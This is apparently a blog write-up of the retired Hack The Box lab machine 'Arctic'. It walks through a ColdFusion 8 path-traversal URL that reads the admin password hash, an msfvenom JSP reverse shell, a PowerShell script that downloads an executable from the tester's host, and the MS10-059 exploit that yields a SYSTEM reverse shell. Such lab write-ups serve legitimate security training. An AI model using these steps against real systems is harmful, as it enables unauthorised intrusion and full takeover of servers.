---
layout: post
title: HTB-Arctic
categories: HTB-Walkthrough
---

![arctic](/assets/img/arctic.png)


Arctic is another OSCP-like box from the HTB 'retired' archive.

`nmap -sV -Pn --min-rate 10000 -p- 10.10.10.11 |tee -a arc.txt`

```

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

fmtp? 

A quick search reveals lots of HTB walkthroughs and writeups for this box, but ignoring them for now...
unless I get really clueless, I have a look for a page that has some explaination of the service and port, and how to enumerate/exploit it!

The service appears to be 'Flight Message Transfer Protocol', which is accessible via the browser

so browsing to `http://10.10.10.11:8500/` we get...

![fmtp](/assets/img/arctic-fmtp.png)


Clicky-linky....

```

Index of /CFIDE/

Parent ..                                              dir   02/21/20 10:05 μμ
Application.cfm                                       1151   03/18/08 11:06 πμ
adminapi/                                              dir   03/22/17 08:53 μμ
administrator/                                         dir   03/22/17 08:55 μμ
classes/                                               dir   03/22/17 08:52 μμ
componentutils/                                        dir   03/22/17 08:52 μμ
debug/                                                 dir   03/22/17 08:52 μμ
images/                                                dir   03/22/17 08:52 μμ
install.cfm                                          12077   03/18/08 11:06 πμ
multiservermonitor-access-policy.xml                   278   03/18/08 11:07 πμ
probe.cfm                                            30778   03/18/08 11:06 πμ
reverse_shell.jsp                                     1498   02/21/20 10:37 μμ
scripts/                                               dir   03/22/17 08:52 μμ
wizards/                                               dir   03/22/17 08:52 μμ


```
Lots of things to click on and explore here....!

```

Index of /cfdocs/

Parent ..                           dir   03/22/17 08:55 μμ
copyright.htm                      3026   03/22/17 08:55 μμ
dochome.htm                        2180   03/22/17 08:55 μμ
getting_started/                    dir   03/22/17 08:55 μμ
htmldocs/                           dir   03/22/17 08:55 μμ
images/                             dir   03/22/17 08:55 μμ
newton.js                          2028   03/22/17 08:55 μμ
newton_ie.css                      3360   03/22/17 08:55 μμ
newton_ns.css                      4281   03/22/17 08:55 μμ
toc.css                             244   03/22/17 08:55 μμ

```

Browsing to
```
http://10.10.10.11:8500/cfdocs/dochome.htm
```

 we get lots of info about ColdFusion 8.

```
http://10.10.10.11:8500/CFIDE/administrator/
```

leads us to a login page for Adobe Coldfusion 8

Lets use searchsploit to see if there are known/public exploits for this version...

`searchsploit coldfusion 8`


```

-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
Adobe ColdFusion - Directory Traversal (Metasploit)                       | exploits/multiple/remote/16985.rb
Adobe ColdFusion 2018 - Arbitrary File Upload                             | exploits/multiple/webapps/45979.txt
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String C | exploits/cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser. | exploits/cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Quer | exploits/cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?st | exploits/cfm/webapps/33168.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Rem | exploits/windows/remote/43993.py
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)         | exploits/cfm/webapps/16788.rb
ColdFusion MX - Missing Template Cross-Site Scripting                     | exploits/cfm/remote/21548.txt
Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure | exploits/multiple/remote/22867.pl
-------------------------------------------------------------------------- --------------------------------------

```


We find a directory traversal/file disclosure exploit:

```

http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en


```



This gives us a hashed password...

```

#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true


#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true


#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true

```

[Crackstation.net](https://crackstation.net/) decrypts this to `happyday` and we gain access to the admin panel.


After a poke about we find a possible route forwards.


Under `Debugging & Logging` goto `Scheduled Tasks`


<h4>schedule new task</h4>

We can use this scheduler to upload a reverse shell.

Use msfvenom to generate shell.jsp

```

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 -f raw > evil.jsp

```


make sure you get the correct path that the file is saved to, 
and tick checkbox to save output to file.

`C:\ColdFusion8\wwwroot\CFIDE\evil.jsp`

set a listener for 443, and python server on 80 to serve file

Point the scheduler to the evil file...
`http://10.10.14.24/evil.jsp`


click the button that executes the task....it contacts the webserver and uploads evil...
and catch the cli shell by browsing to the location of the file...

'http:10.10.10.11:8500/CFIDE/evil.jsp'

we get a shell via our nc listener...



```


C:\Users>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          9/8/2019, 8:22:16 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz
                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.024 MB
Available Physical Memory: 295 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 1.250 MB
Virtual Memory: In Use:    798 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11

```


I copied n pasted the output to my Kali box to sysinfo.txt, and ran it with windows-exploit-suggester.py


```

root@kali:~/HTB/retired/arctic# python windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2020-02-21-mssb.xls
[*] done
root@kali:~/HTB/retired/arctic# ls
2020-02-21-mssb.xls  arc.txt  c.exe  evil.jsp  info.txt  windows-exploit-suggester.py
root@kali:~/HTB/retired/arctic# python windows-exploit-suggester.py --database 2020-02-21-mssb.xls --systeminfo info.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

```



Select ms10-059 (chimichurri) which I have (found in a repository of windows exploits on github)


uploaded the file ....use the powershell wget type method found [here](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html)


```

echo $webclient = New-Object System.Net.WebClient >>wget.ps1

echo $url = "http://10.10.14.20/c.exe" >>wget.ps1

echo $file = "c.exe" >>wget.ps1

echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

```

set nc listener on 999


```

c:\boo>c.exe 10.10.14.20 999
c.exe 10.10.14.20 999
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
c:\boo>

```


got system shell in nc listener...


```

listening on [any] 999 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.11] 58122
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\boo>whoami
whoami
nt authority\system

```

Get Flags....

```

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of c:\Users

22/03/2017  09:00 ��    <DIR>          .
22/03/2017  09:00 ��    <DIR>          ..
22/03/2017  08:10 ��    <DIR>          Administrator
14/07/2009  06:57 ��    <DIR>          Public
22/03/2017  09:00 ��    <DIR>          tolis
               0 File(s)              0 bytes
               5 Dir(s)  33.182.863.360 bytes free

c:\Users>type tolis\desktop\user.txt
type tolis\desktop\user.txt
02xxxxxxxxxxxxxxxxxxxxxxxxxxxxf3
c:\Users>type Administrator\desktop\root.txt
type Administrator\desktop\root.txt
ce6xxxxxxxxxxxxxxxxxxxxxxxxxxx90
c:\Users>

```


:)


